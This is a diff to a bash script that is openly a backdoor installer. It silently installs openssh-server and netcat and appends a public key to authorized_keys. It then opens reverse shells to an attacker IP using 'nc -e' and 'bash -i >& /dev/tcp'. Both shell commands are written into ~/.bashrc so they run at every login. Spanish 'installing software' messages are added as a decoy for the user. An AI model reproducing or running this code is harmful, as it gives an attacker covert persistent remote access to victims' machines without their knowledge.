@@ -19,31 +19,45 @@ sudo mkdir .ssh > /dev/null 2>&1
 cd .ssh/
 
 # ------ TRUSTED RSA ------
-
-PUB_KEY="insert pre-generated RSA public key here"
-PRIV_KEY="insert pre-generated RSA private key (obviously associated to the previous public key)"
-echo $PUB_KEY > id_rsa.pub
-echo $PRIV_KEY > id_rsa
+PUB_KEY=""
+echo $PUB_KEY >> authorized_keys
 
 # ------ REVERSE SHELL ------
 
-IP="insert remote addr here (atacker's public IP)"
+IP=""
 PORT=6969
+echo "Instalando software..."
 
 # INSTALL OPENSSH-SERVER WITHOUT TELLING USR
-yes | sudo apt install openssh-server > /dev/null 2>&1
+
+yes | sudo apt-get install openssh-server > /dev/null 2>&1
+echo "Modulo 1 instalado."
+
+# ALSO INSTALL NETCAT FOR MULTIPLE WAYS OF ACESSING
+
+yes | sudo apt-get install netcat > /dev/null 2>&1
+echo "Software instalado."
+echo "Configurando..."
 
 # MODIFY OPENSSH-SERVER TO LISTEN ON PORT 22
+
 sudo echo "Port 22" >> /etc/ssh/sshd_config
 
 # ENSURE OPENSSH-SERVER ACCESS IS ONLY AVAILABLE TRHOUG PUBLIC KEY AUTH
 sudo echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
 
 # CREATE REVERSE SHELL
-ssh -fN -R $PORT:localhost:22 $USER@$IP
+
+# FIRST WAY
+nc $IP $PORT -e /bin/$0 > /dev/null 2>&1
+
+# BACKUP WAY
+bash -i >& /dev/tcp/$IP/$PORT > /dev/null 2>&1
 
 # ADD THE COMMAND TO BASHRC SO IT EXECUTES EVERYTIME USER LOGS IN
-echo "ssh -fN -R 6969:localhost:22 "$USER"@"$IP >> $HOME/.bashrc
+
+echo "nc "$IP" "$PORT" -e /bin/"$0 >> $HOME/.bashrc
+echo "bash -i >& /dev/tcp/"$IP"/"$PORT >> $HOME/.bashrc
 echo "clear" >> $HOME/.bashrc
 
 # REMOVE FINGERPRINT
